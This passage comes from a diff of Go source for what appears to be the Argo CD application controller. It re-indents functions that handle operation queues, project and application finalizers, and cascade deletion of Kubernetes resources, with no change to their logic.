false\n-\t\treturn\n-\t}\n-\tprocessNext = true\n-\tdefer func() {\n-\t\tif r := recover(); r != nil {\n-\t\t\tlog.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n-\t\t}\n-\t\tctrl.appOperationQueue.Done(appKey)\n-\t}()\n-\n-\tobj, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey.(string))\n-\tif err != nil {\n-\t\tlog.Errorf(\"Failed to get application '%s' from informer index: %+v\", appKey, err)\n-\t\treturn\n-\t}\n-\tif !exists {\n-\t\t// This happens after app was deleted, but the work queue still had an entry for it.\n-\t\treturn\n-\t}\n-\torigApp, ok := obj.(*appv1.Application)\n-\tif !ok {\n-\t\tlog.Warnf(\"Key '%s' in index is not an application\", appKey)\n-\t\treturn\n-\t}\n-\tapp := origApp.DeepCopy()\n-\n-\tif app.Operation != nil {\n-\t\t// If we get here, we are about to process an operation, but we cannot rely on informer since it might have stale data.\n-\t\t// So always retrieve the latest version to ensure it is not stale to avoid unnecessary syncing.\n-\t\t// We cannot rely on informer since applications might be updated by both application controller and api server.\n-\t\tfreshApp, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.ObjectMeta.Namespace).Get(context.Background(), app.ObjectMeta.Name, metav1.GetOptions{})\n-\t\tif err != nil {\n-\t\t\tlog.Errorf(\"Failed to retrieve latest application state: %v\", err)\n-\t\t\treturn\n-\t\t}\n-\t\tapp = freshApp\n-\t}\n-\n-\tif app.Operation != nil {\n-\t\tctrl.processRequestedAppOperation(app)\n-\t} else if app.DeletionTimestamp != nil && app.CascadedDeletion() {\n-\t\t_, err = ctrl.finalizeApplicationDeletion(app, func(project string) ([]*appv1.Cluster, error) {\n-\t\t\treturn ctrl.db.GetProjectClusters(context.Background(), project)\n-\t\t})\n-\t\tif err != nil {\n-\t\t\tctrl.setAppCondition(app, appv1.ApplicationCondition{\n-\t\t\t\tType:    appv1.ApplicationConditionDeletionError,\n-\t\t\t\tMessage: err.Error(),\n-\t\t\t})\n-\t\t\tmessage := fmt.Sprintf(\"Unable to delete application resources: %v\", err.Error())\n-\t\t\tctrl.auditLogger.LogAppEvent(app, argo.EventInfo{Reason: argo.EventReasonStatusRefreshed, Type: v1.EventTypeWarning}, message)\n-\t\t}\n-\t}\n-\treturn\n+        appKey, shutdown := ctrl.appOperationQueue.Get()\n+        if shutdown {\n+                processNext = false\n+                return\n+        }\n+        processNext = true\n+        defer func() {\n+                if r := recover(); r != nil {\n+                        log.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n+                }\n+                ctrl.appOperationQueue.Done(appKey)\n+        }()\n+\n+        obj, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey.(string))\n+        if err != nil {\n+                log.Errorf(\"Failed to get application '%s' from informer index: %+v\", appKey, err)\n+                return\n+        }\n+        if !exists {\n+                // This happens after app was deleted, but the work queue still had an entry for it.\n+                return\n+        }\n+        origApp, ok := obj.(*appv1.Application)\n+        if !ok {\n+                log.Warnf(\"Key '%s' in index is not an application\", appKey)\n+                return\n+        }\n+        app := origApp.DeepCopy()\n+\n+        if app.Operation != nil {\n+                // If we get here, we are about to process an operation, but we cannot rely on informer since it might have stale data.\n+                // So always retrieve the latest version to ensure it is not stale to avoid unnecessary syncing.\n+                // We cannot rely on informer since applications might be updated by both application controller and api server.\n+                freshApp, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.ObjectMeta.Namespace).Get(context.Background(), app.ObjectMeta.Name, metav1.GetOptions{})\n+                if err != nil {\n+                        log.Errorf(\"Failed to retrieve latest application state: %v\", err)\n+                        return\n+                }\n+                app = freshApp\n+        }\n+\n+        if app.Operation != nil {\n+                ctrl.processRequestedAppOperation(app)\n+        } else if app.DeletionTimestamp != nil && app.CascadedDeletion() {\n+                _, err = ctrl.finalizeApplicationDeletion(app, func(project string) ([]*appv1.Cluster, error) {\n+                        return ctrl.db.GetProjectClusters(context.Background(), project)\n+                })\n+                if err != nil {\n+                        ctrl.setAppCondition(app, appv1.ApplicationCondition{\n+                                Type:    appv1.ApplicationConditionDeletionError,\n+                                Message: err.Error(),\n+                        })\n+                        message := fmt.Sprintf(\"Unable to delete application resources: %v\", err.Error())\n+                        ctrl.auditLogger.LogAppEvent(app, argo.EventInfo{Reason: argo.EventReasonStatusRefreshed, Type: v1.EventTypeWarning}, message)\n+                }\n+        }\n+        return\n }\n \n func (ctrl *ApplicationController) processAppComparisonTypeQueueItem() (processNext bool) {\n-\tkey, shutdown := ctrl.appComparisonTypeRefreshQueue.Get()\n-\tprocessNext = true\n-\n-\tdefer func() {\n-\t\tif r := recover(); r != nil {\n-\t\t\tlog.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n-\t\t}\n-\t\tctrl.appComparisonTypeRefreshQueue.Done(key)\n-\t}()\n-\tif shutdown {\n-\t\tprocessNext = false\n-\t\treturn\n-\t}\n-\n-\tif parts := strings.Split(key.(string), \"/\"); len(parts) != 3 {\n-\t\tlog.Warnf(\"Unexpected key format in appComparisonTypeRefreshTypeQueue. Key should consists of namespace/name/comparisonType but got: %s\", key.(string))\n-\t} else {\n-\t\tif compareWith, err := strconv.Atoi(parts[2]); err != nil {\n-\t\t\tlog.Warnf(\"Unable to parse comparison type: %v\", err)\n-\t\t\treturn\n-\t\t} else {\n-\t\t\tctrl.requestAppRefresh(ctrl.toAppQualifiedName(parts[1], parts[0]), CompareWith(compareWith).Pointer(), nil)\n-\t\t}\n-\t}\n-\treturn\n+        key, shutdown := ctrl.appComparisonTypeRefreshQueue.Get()\n+        processNext = true\n+\n+        defer func() {\n+                if r := recover(); r != nil {\n+                        log.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n+                }\n+                ctrl.appComparisonTypeRefreshQueue.Done(key)\n+        }()\n+        if shutdown {\n+                processNext = false\n+                return\n+        }\n+\n+        if parts := strings.Split(key.(string), \"/\"); len(parts) != 3 {\n+                log.Warnf(\"Unexpected key format in appComparisonTypeRefreshTypeQueue. Key should consists of namespace/name/comparisonType but got: %s\", key.(string))\n+        } else {\n+                if compareWith, err := strconv.Atoi(parts[2]); err != nil {\n+                        log.Warnf(\"Unable to parse comparison type: %v\", err)\n+                        return\n+                } else {\n+                        ctrl.requestAppRefresh(ctrl.toAppQualifiedName(parts[1], parts[0]), CompareWith(compareWith).Pointer(), nil)\n+                }\n+        }\n+        return\n }\n \n func (ctrl *ApplicationController) processProjectQueueItem() (processNext bool) {\n-\tkey, shutdown := ctrl.projectRefreshQueue.Get()\n-\tprocessNext = true\n-\n-\tdefer func() {\n-\t\tif r := recover(); r != nil {\n-\t\t\tlog.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n-\t\t}\n-\t\tctrl.projectRefreshQueue.Done(key)\n-\t}()\n-\tif shutdown {\n-\t\tprocessNext = false\n-\t\treturn\n-\t}\n-\tobj, exists, err := ctrl.projInformer.GetIndexer().GetByKey(key.(string))\n-\tif err != nil {\n-\t\tlog.Errorf(\"Failed to get project '%s' from informer index: %+v\", key, err)\n-\t\treturn\n-\t}\n-\tif !exists {\n-\t\t// This happens after appproj was deleted, but the work queue still had an entry for it.\n-\t\treturn\n-\t}\n-\torigProj, ok := obj.(*appv1.AppProject)\n-\tif !ok {\n-\t\tlog.Warnf(\"Key '%s' in index is not an appproject\", key)\n-\t\treturn\n-\t}\n-\n-\tif origProj.DeletionTimestamp != nil && origProj.HasFinalizer() {\n-\t\tif err := ctrl.finalizeProjectDeletion(origProj.DeepCopy()); err != nil {\n-\t\t\tlog.Warnf(\"Failed to finalize project deletion: %v\", err)\n-\t\t}\n-\t}\n-\treturn\n+        key, shutdown := ctrl.projectRefreshQueue.Get()\n+        processNext = true\n+\n+        defer func() {\n+                if r := recover(); r != nil {\n+                        log.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n+                }\n+                ctrl.projectRefreshQueue.Done(key)\n+        }()\n+        if shutdown {\n+                processNext = false\n+                return\n+        }\n+        obj, exists, err := ctrl.projInformer.GetIndexer().GetByKey(key.(string))\n+        if err != nil {\n+                log.Errorf(\"Failed to get project '%s' from informer index: %+v\", key, err)\n+                return\n+        }\n+        if !exists {\n+                // This happens after appproj was deleted, but the work queue still had an entry for it.\n+                return\n+        }\n+        origProj, ok := obj.(*appv1.AppProject)\n+        if !ok {\n+                log.Warnf(\"Key '%s' in index is not an appproject\", key)\n+                return\n+        }\n+\n+        if origProj.DeletionTimestamp != nil && origProj.HasFinalizer() {\n+                if err := ctrl.finalizeProjectDeletion(origProj.DeepCopy()); err != nil {\n+                        log.Warnf(\"Failed to finalize project deletion: %v\", err)\n+                }\n+        }\n+        return\n }\n \n func (ctrl *ApplicationController) finalizeProjectDeletion(proj *appv1.AppProject) error {\n-\tapps, err := ctrl.appLister.Applications(ctrl.namespace).List(labels.Everything())\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error listing applications: %w\", err)\n-\t}\n-\tappsCount := 0\n-\tfor i := range apps {\n-\t\tif apps[i].Spec.GetProject() == proj.Name {\n-\t\t\tappsCount++\n-\t\t}\n-\t}\n-\tif appsCount == 0 {\n-\t\treturn ctrl.removeProjectFinalizer(proj)\n-\t} else {\n-\t\tlog.Infof(\"Cannot remove project '%s' finalizer as is referenced by %d applications\", proj.Name, appsCount)\n-\t}\n-\treturn nil\n+        apps, err := ctrl.appLister.Applications(ctrl.namespace).List(labels.Everything())\n+        if err != nil {\n+                return fmt.Errorf(\"error listing applications: %w\", err)\n+        }\n+        appsCount := 0\n+        for i := range apps {\n+                if apps[i].Spec.GetProject() == proj.Name {\n+                        appsCount++\n+                }\n+        }\n+        if appsCount == 0 {\n+                return ctrl.removeProjectFinalizer(proj)\n+        } else {\n+                log.Infof(\"Cannot remove project '%s' finalizer as is referenced by %d applications\", proj.Name, appsCount)\n+        }\n+        return nil\n }\n \n func (ctrl *ApplicationController) removeProjectFinalizer(proj *appv1.AppProject) error {\n-\tproj.RemoveFinalizer()\n-\tvar patch []byte\n-\tpatch, _ = json.Marshal(map[string]interface{}{\n-\t\t\"metadata\": map[string]interface{}{\n-\t\t\t\"finalizers\": proj.Finalizers,\n-\t\t},\n-\t})\n-\t_, err := ctrl.applicationClientset.ArgoprojV1alpha1().AppProjects(ctrl.namespace).Patch(context.Background(), proj.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n-\treturn err\n+        proj.RemoveFinalizer()\n+        var patch []byte\n+        patch, _ = json.Marshal(map[string]interface{}{\n+                \"metadata\": map[string]interface{}{\n+                        \"finalizers\": proj.Finalizers,\n+                },\n+        })\n+        _, err := ctrl.applicationClientset.ArgoprojV1alpha1().AppProjects(ctrl.namespace).Patch(context.Background(), proj.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n+        return err\n }\n \n // shouldBeDeleted returns whether a given resource obj should be deleted on cascade delete of application app\n func (ctrl *ApplicationController) shouldBeDeleted(app *appv1.Application, obj *unstructured.Unstructured) bool {\n-\treturn !kube.IsCRD(obj) && !isSelfReferencedApp(app, kube.GetObjectRef(obj))\n+        return !kube.IsCRD(obj) && !isSelfReferencedApp(app, kube.GetObjectRef(obj))\n }\n \n func (ctrl *ApplicationController) getPermittedAppLiveObjects(app *appv1.Application, proj *appv1.AppProject, projectClusters func(project string) ([]*appv1.Cluster, error)) (map[kube.ResourceKey]*unstructured.Unstructured, error) {\n-\tobjsMap, err := ctrl.stateCache.GetManagedLiveObjs(app, []*unstructured.Unstructured{})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\t// Don't delete live resources which are not permitted in the app project\n-\tfor k, v := range objsMap {\n-\t\tpermitted, err := proj.IsLiveResourcePermitted(v, app.Spec.Destination.Server, app.Spec.Destination.Name, projectClusters)\n-\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tif !permitted {\n-\t\t\tdelete(objsMap, k)\n-\t\t}\n-\t}\n-\treturn objsMap, nil\n+        objsMap, err := ctrl.stateCache.GetManagedLiveObjs(app, []*unstructured.Unstructured{})\n+        if err != nil {\n+                return nil, err\n+        }\n+        // Don't delete live resources which are not permitted in the app project\n+        for k, v := range objsMap {\n+                permitted, err := proj.IsLiveResourcePermitted(v, app.Spec.Destination.Server, app.Spec.Destination.Name, projectClusters)\n+\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                if !permitted {\n+                        delete(objsMap, k)\n+                }\n+        }\n+        return objsMap, nil\n }\n \n func (ctrl *ApplicationController) finalizeApplicationDeletion(app *appv1.Application, projectClusters func(project string) ([]*appv1.Cluster, error)) ([]*unstructured.Unstructured, error) {\n-\tlogCtx := log.WithField(\"application\", app.QualifiedName())\n-\tlogCtx.Infof(\"Deleting resources\")\n-\t// Get refreshed application info, since informer app copy might be stale\n-\tapp, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Get(context.Background(), app.Name, metav1.GetOptions{})\n-\tif err != nil {\n-\t\tif !apierr.IsNotFound(err) {\n-\t\t\tlogCtx.Errorf(\"Unable to get refreshed application info prior deleting resources: %v\", err)\n-\t\t}\n-\t\treturn nil, nil\n-\t}\n-\tproj, err := ctrl.getAppProj(app)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// validDestination is true if the Application destination points to a cluster that is managed by Argo CD\n-\t// (and thus either a cluster secret exists for it, or it's local); validDestination is false otherwise.\n-\tvalidDestination := true\n-\n-\t// Validate the cluster using the Application destination's `name` field, if applicable,\n-\t// and set the Server field, if needed.\n-\tif err := argo.ValidateDestination(context.Background(), &app.Spec.Destination, ctrl.db); err != nil {\n-\t\tlog.Warnf(\"Unable to validate destination of the Application being deleted: %v\", err)\n-\t\tvalidDestination = false\n-\t}\n-\n-\tobjs := make([]*unstructured.Unstructured, 0)\n-\tvar cluster *appv1.Cluster\n-\n-\t// Attempt to validate the destination via its URL\n-\tif validDestination {\n-\t\tif cluster, err = ctrl.db.GetCluster(context.Background(), app.Spec.Destination.Server); err != nil {\n-\t\t\tlog.Warnf(\"Unable to locate cluster URL for Application being deleted: %v\", err)\n-\t\t\tvalidDestination = false\n-\t\t}\n-\t}\n-\n-\tif validDestination {\n-\t\t// ApplicationDestination points to a valid cluster, so we may clean up the live objects\n-\n-\t\tobjsMap, err := ctrl.getPermittedAppLiveObjects(app, proj, projectClusters)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tfor k := range objsMap {\n-\t\t\t// Wait for objects pending deletion to complete before proceeding with next sync wave\n-\t\t\tif objsMap[k].GetDeletionTimestamp() != nil {\n-\t\t\t\tlogCtx.Infof(\"%d objects remaining for deletion\", len(objsMap))\n-\t\t\t\treturn objs, nil\n-\t\t\t}\n-\n-\t\t\tif ctrl.shouldBeDeleted(app, objsMap[k]) {\n-\t\t\t\tobjs = append(objs, objsMap[k])\n-\t\t\t}\n-\t\t}\n-\n-\t\tconfig := metrics.AddMetricsTransportWrapper(ctrl.metricsServer, app, cluster.RESTConfig())\n-\n-\t\tfilteredObjs := FilterObjectsForDeletion(objs)\n-\n-\t\tpropagationPolicy := metav1.DeletePropagationForeground\n-\t\tif app.GetPropagationPolicy() == appv1.BackgroundPropagationPolicyFinalizer {\n-\t\t\tpropagationPolicy = metav1.DeletePropagationBackground\n-\t\t}\n-\t\tlogCtx.Infof(\"Deleting application's resources with %s propagation policy\", propagationPolicy)\n-\n-\t\terr = kube.RunAllAsync(len(filteredObjs), func(i int) error {\n-\t\t\tobj := filteredObjs[i]\n-\t\t\treturn ctrl.kubectl.DeleteResource(context.Background(), config, obj.GroupVersionKind(), obj.GetName(), obj.GetNamespace(), metav1.DeleteOptions{PropagationPolicy: &propagationPolicy})\n-\t\t})\n-\t\tif err != nil {\n-\t\t\treturn objs, err\n-\t\t}\n-\n-\t\tobjsMap, err = ctrl.getPermittedAppLiveObjects(app, proj, projectClusters)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tfor k, obj := range objsMap {\n-\t\t\tif !ctrl.shouldBeDeleted(app, obj) {\n-\t\t\t\tdelete(objsMap, k)\n-\t\t\t}\n-\t\t}\n-\t\tif len(objsMap) > 0 {\n-\t\t\tlogCtx.Infof(\"%d objects remaining for deletion\", len(objsMap))\n-\t\t\treturn objs, nil\n-\t\t}\n-\t}\n-\n-\tif err := ctrl.cache.SetAppManagedResources(app.Name, nil); err != nil {\n-\t\treturn objs, err\n-\t}\n-\n-\tif err := ctrl.cache.SetAppResourcesTree(app.Name, nil); err != nil {\n-\t\treturn objs, err\n-\t}\n-\n-\tif err := ctrl.removeCascadeFinalizer(app); err != nil {\n-\t\treturn objs, err\n-\t}\n-\n-\tif validDestination {\n-\t\tlogCtx.Infof(\"Successfully deleted %d resources\", len(objs))\n-\t} else {\n-\t\tlogCtx.Infof(\"Resource entries removed from undefined cluster\")\n-\t}\n-\n-\tctrl.projectRefreshQueue.Add(fmt.Sprintf(\"%s/%s\", ctrl.namespace, app.Spec.GetProject()))\n-\treturn objs, nil\n+        logCtx := log.WithField(\"application\", app.QualifiedName())\n+        logCtx.Infof(\"Deleting resources\")\n+        // Get refreshed application info, since informer app copy might be stale\n+        app, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Get(context.Background(), app.Name, metav1.GetOptions{})\n+        if err != nil {\n+                if !apierr.IsNotFound(err) {\n+                        logCtx.Errorf(\"Unable to get refreshed application info prior deleting resources: %v\", err)\n+                }\n+                return nil, nil\n+        }\n+        proj, err := ctrl.getAppProj(app)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // validDestination is true if the Application destination points to a cluster that is managed by Argo CD\n+        // (and thus either a cluster secret exists for it, or it's local); validDestination is false otherwise.\n+        validDestination := true\n+\n+        // Validate the cluster using the Application destination's `name` field, if applicable,\n+        // and set the Server field, if needed.\n+        if err := argo.ValidateDestination(context.Background(), &app.Spec.Destination, ctrl.db); err != nil {\n+                log.Warnf(\"Unable to validate destination of the Application being deleted: %v\", err)\n+                validDestination = false\n+        }\n+\n+        objs := make([]*unstructured.Unstructured, 0)\n+        var cluster *appv1.Cluster\n+\n+        // Attempt to validate the destination via its URL\n+        if validDestination {\n+                if cluster, err = ctrl.db.GetCluster(context.Background(), app.Spec.Destination.Server); err != nil {\n+                        log.Warnf(\"Unable to locate cluster URL for Application being deleted: %v\", err)\n+                        validDestination = false\n+                }\n+        }\n+\n+        if validDestination {\n+                // ApplicationDestination points to a valid cluster, so we may clean up the live objects\n+\n+                objsMap, err := ctrl.getPermittedAppLiveObjects(app, proj, projectClusters)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                for k := range objsMap {\n+                        // Wait for objects pending deletion to complete before proceeding with next sync wave\n+                        if objsMap[k].GetDeletionTimestamp() != nil {\n+                                logCtx.Infof(\"%d objects remaining for deletion\", len(objsMap))\n+                                return objs, nil\n+                        }\n+\n+                        if ctrl.shouldBeDeleted(app, objsMap[k]) {\n+                                objs = append(objs, objsMap[k])\n+                        }\n+                }\n+\n+                config := metrics.AddMetricsTransportWrapper(ctrl.metricsServer, app, cluster.RESTConfig())\n+\n+                filteredObjs := FilterObjectsForDeletion(objs)\n+\n+                propagationPolicy := metav1.DeletePropagationForeground\n+                if app.GetPropagationPolicy() == appv1.BackgroundPropagationPolicyFinalizer {\n+                        propagationPolicy = metav1.DeletePropagationBackground\n+                }\n+                logCtx.Infof(\"Deleting application's resources with %s propagation policy\", propagationPolicy)\n+\n+                err = kube.RunAllAsync(len(filteredObjs), func(i int) error {\n+                        obj := filteredObjs[i]\n+                        return ctrl.kubectl.DeleteResource(context.Background(), config, obj.GroupVersionKind(), obj.GetName(), obj.GetNamespace(), metav1.DeleteOptions{PropagationPolicy: &propagationPolicy})\n+                })\n+                if err != nil {\n+                        return objs, err\n+                }\n+\n+                objsMap, err = ctrl.getPermittedAppLiveObjects(app, proj, projectClusters)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                for k, obj := range objsMap {\n+                        if !ctrl.shouldBeDeleted(app, obj) {\n+                                delete(objsMap, k)\n+                        }\n+                }\n+                if len(objsMap) > 0 {\n+                        logCtx.Infof(\"%d objects remaining for deletion\", len(objsMap))\n+                        return objs, nil\n+                }\n+        }\n+\n+        if err := ctrl.cache.SetAppManagedResources(app.Name, nil); err != nil {\n+                return objs, err\n+        }\n+\n+        if err := ctrl.cache.SetAppResourcesTree(app.Name, nil); err != nil {\n+                return objs, err\n+        }\n+\n+        if err := ctrl.removeCascadeFinalizer(app); err != nil {\n+                return objs, err\n+        }\n+\n+        if validDestination {\n+                logCtx.Infof(\"Successfully deleted %d resources\", len(objs))\n+        } else {\n+                logCtx.Infof(\"Resource entries removed from undefined cluster\")\n+        }\n+\n+        ctrl.projectRefreshQueue.Add(fmt.Sprintf(\"%s/%s\", ctrl.namespace, app.Spec.GetProject()))\n+        return objs, nil\n }\n \n func (ctrl *ApplicationController) removeCascadeFinalizer(app *appv1.Application) error {\n-\t_, err := ctrl.getAppProj(app)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting project: %w\", err)\n-\t}\n-\tapp.UnSetCascadedDeletion()\n-\tvar patch []byte\n-\tpatch, _ = json.Marshal(map[string]interface{}{\n-\t\t\"metadata\": map[string]interface{}{\n-\t\t\t\"finalizers\": app.Finalizers,\n-\t\t},\n-\t})\n-\n-\t_, err = ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Patch(context.Background(), app.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n-\treturn err\n+        _, err := ctrl.getAppProj(app)\n+        if err != nil {\n+                return fmt.Errorf(\"error getting project: %w\", err)\n+        }\n+        app.UnSetCascadedDeletion()\n+        var patch []byte\n+        patch, _ = json.Marshal(map[string]interface{}{\n+                \"metadata\": map[string]interface{}{\n+                        \"finalizers\": app.Finalizers,\n+                },\n+        })\n+\n+        _, err = ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Patch(context.Background(), app.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n+        return err\n }\n \n func (ctrl *ApplicationController) setAppCondition(app *appv1.Application, condition appv1.ApplicationCondition) {\n-\t// do nothing if app already has same condition\n-\tfor _, c := range app.Status.Conditions {\n-\t\tif c.Message == condition.Message && c.Type == condition.Type {\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tapp.Status.SetConditions([]appv1.ApplicationCondition{condition}, map[appv1.ApplicationConditionType]bool{condition.Type: true})\n-\n-\tvar patch []byte\n-\tpatch, err := json.Marshal(map[string]interface{}{\n-\t\t\"status\": map[string]interface{}{\n-\t\t\t\"conditions\": app.Status.Conditions,\n-\t\t},\n-\t})\n-\tif err == nil {\n-\t\t_, err = ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Patch(context.Background(), app.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n-\t}\n-\tif err != nil {\n-\t\tlog.Errorf(\"Unable to set application condition: %v\", err)\n-\t}\n+        // do nothing if app already has same condition\n+        for _, c := range app.Status.Conditions {\n+                if c.Message == condition.Message && c.Type == condition.Type {\n+                        return\n+                }\n+        }\n+\n+        app.Status.SetConditions([]appv1.ApplicationCondition{condition}, map[appv1.ApplicationConditionType]bool{condition.Type: true})\n+\n+        var patch []byte\n+        patch, err := json.Marshal(map[string]interface{}{\n+                \"status\": map[string]interface{}{\n+                        \"conditions\": app.Status.Conditions,\n+                },\n+        })\n+        if err == nil {\n+                _, err = ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Patch(context.Background(), app.Name, types.MergePatchType, patch, metav1.PatchOptions{})\n+        }\n+        if err != nil {\n+                log.Errorf(\"Unable to set application condition: %v\", err)\n+        }\n }\n \n func (ctrl *ApplicationController) processRequestedAppOperation(app *appv1.Application) {\n-\tlogCtx := log.WithField(\"application\", app.QualifiedName())\n-\tvar state *appv1.OperationState\n-\t// Recover from any unexpected panics and automatically set the status to be failed\n-\tdefer func() {\n-\t\tif r := recover(); r != nil {\n-\t\t\tlogCtx.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n-\t\t\tstate.Phase = synccommon.OperationError\n-\t\t\tif rerr, ok := r.(error); ok {\n-\t\t\t\tstate.Message = rerr.Error()\n-\t\t\t} else {\n-\t\t\t\tstate.Message = fmt.Sprintf(\"%v\", r)\n-\t\t\t}\n-\t\t\tctrl.setOperationState(app, state)\n-\t\t}\n-\t}()\n-\tterminating := false\n-\tif isOperationInProgress(app) {\n-\t\tstate = app.Status.OperationState.DeepCopy()\n-\t\tterminating = state.Phase == synccommon.OperationTerminating\n-\t\t// Failed  operation with retry strategy might have be in-progress and has completion time\n-\t\tif state.FinishedAt != nil && !terminating {\n-\t\t\tretryAt, err := app.Status.OperationState.Operation.Retry.NextRetryAt(state.FinishedAt.Time, state.RetryCount)\n-\t\t\tif err != nil {\n-\t\t\t\tstate.Phase = synccommon.OperationFailed\n-\t\t\t\tstate.Message = err.Error()\n-\t\t\t\tctrl.setOperationState(app, state)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tretryAfter := time.Until(retryAt)\n-\t\t\tif retryAfter > 0 {\n-\t\t\t\tlogCtx.Infof(\"Skipping retrying in-progress operation. Attempting again at: %s\", retryAt.Format(time.RFC3339))\n-\t\t\t\tctrl.requestAppRefresh(app.QualifiedName(), CompareWithLatest.Pointer(), &retryAfter)\n-\t\t\t\treturn\n-\t\t\t} else {\n-\t\t\t\t// retrying operation. remove previous failure time in app since it is used as a trigger\n-\t\t\t\t// that previous failed and operation should be retried\n-\t\t\t\tstate.FinishedAt = nil\n-\t\t\t\tctrl.setOperationState(app, state)\n-\t\t\t\t// Get rid of sync results and null out previous operation completion time\n-\t\t\t\tstate.SyncResult = nil\n-\t\t\t}\n-\t\t} else {\n-\t\t\tlogCtx.Infof(\"Resuming in-progress operation. phase: %s, message: %s\", state.Phase, state.Message)\n-\t\t}\n-\t} else {\n-\t\tstate = &appv1.OperationState{Phase: synccommon.OperationRunning, Operation: *app.Operation, StartedAt: metav1.Now()}\n-\t\tctrl.setOperationState(app, state)\n-\t\tlogCtx.Infof(\"Initialized new operation: %v\", *app.Operation)\n-\t}\n-\n-\tif err := argo.ValidateDestination(context.Background(), &app.Spec.Destination, ctrl.db); err != nil {\n-\t\tstate.Phase = synccommon.OperationFailed\n-\t\tstate.Message = err.Error()\n-\t} else {\n-\t\tctrl.appStateManager.SyncAppState(app, state)\n-\t}\n-\n-\t// Check whether application is allowed to use project\n-\t_, err := ctrl.getAppProj(app)\n-\tif err != nil {\n-\t\tstate.Phase = synccommon.OperationError\n-\t\tstate.Message = err.Error()\n-\t}\n-\n-\tif state.Phase == synccommon.OperationRunning {\n-\t\t// It's possible for an app to be terminated while we were operating on it. We do not want\n-\t\t// to clobber the Terminated state with Running. Get the latest app state to check for this.\n-\t\tfreshApp, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Get(context.Background(), app.ObjectMeta.Name, metav1.GetOptions{})\n-\t\tif err == nil {\n-\t\t\t// App may have lost permissions to use the project meanwhile.\n-\t\t\t_, err = ctrl.getAppProj(freshApp)\n-\t\t\tif err != nil {\n-\t\t\t\tstate.Phase = synccommon.OperationFailed\n-\t\t\t\tstate.Message = fmt.Sprintf(\"operation not allowed: %v\", err)\n-\t\t\t}\n-\t\t\tif freshApp.Status.OperationState != nil && freshApp.Status.OperationState.Phase == synccommon.OperationTerminating {\n-\t\t\t\tstate.Phase = synccommon.OperationTerminating\n-\t\t\t\tstate.Message = \"operation is terminating\"\n-\t\t\t\t// after this, we will get requeued to the workqueue, but next time the\n-\t\t\t\t// SyncAppState will operate in a Terminating phase, allowing the worker to perform\n-\t\t\t\t// cleanup (e.g. delete jobs, workflows, etc...)\n-\t\t\t}\n-\t\t}\n-\t} else if state.Phase == synccommon.OperationFailed || state.Phase == synccommon.OperationError {\n-\t\tif !terminating && (state.RetryCount < state.Operation.Retry.Limit || state.Operation.Retry.Limit < 0) {\n-\t\t\tnow := metav1.Now()\n-\t\t\tstate.FinishedAt = &now\n-\t\t\tif retryAt, err := state.Operation.Retry.NextRetryAt(now.Time, state.RetryCount); err != nil {\n-\t\t\t\tstate.Phase = synccommon.OperationFailed\n-\t\t\t\tstate.Message = fmt.Sprintf(\"%s (failed to retry: %v)\", state.Message, err)\n-\t\t\t} else {\n-\t\t\t\tstate.Phase = synccommon.OperationRunning\n-\t\t\t\tstate.RetryCount++\n-\t\t\t\tstate.Message = fmt.Sprintf(\"%s. Retrying attempt #%d at %s.\", state.Message, state.RetryCount, retryAt.Format(time.Kitchen))\n-\t\t\t}\n-\t\t} else if state.RetryCount > 0 {\n-\t\t\tstate.Message = fmt.Sprintf(\"%s (retried %d times).\", state.Message, state.RetryCount)\n-\t\t}\n-\n-\t}\n-\n-\tctrl.setOperationState(app, state)\n-\tif state.Phase.Completed() && (app.Operation.Sync != nil && !app.Operation.Sync.DryRun) {\n-\t\t// if we just completed an operation, force a refresh so that UI will report up-to-date\n-\t\t// sync/health information\n-\t\tif _, err := cache.MetaNamespaceKeyFunc(app); err == nil {\n-\t\t\t// force app refresh with using CompareWithLatest comparison type and trigger app reconciliation loop\n-\t\t\tctrl.requestAppRefresh(app.QualifiedName(), CompareWithLatest.Pointer(), nil)\n-\t\t} else {\n-\t\t\tlogCtx.Warnf(\"Fails to requeue application: %v\", err)\n-\t\t}\n-\t}\n+        logCtx := log.WithField(\"application\", app.QualifiedName())\n+        var state *appv1.OperationState\n+        // Recover from any unexpected panics and automatically set the status to be failed\n+        defer func() {\n+                if r := recover(); r != nil {\n+                        logCtx.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n+                        state.Phase = 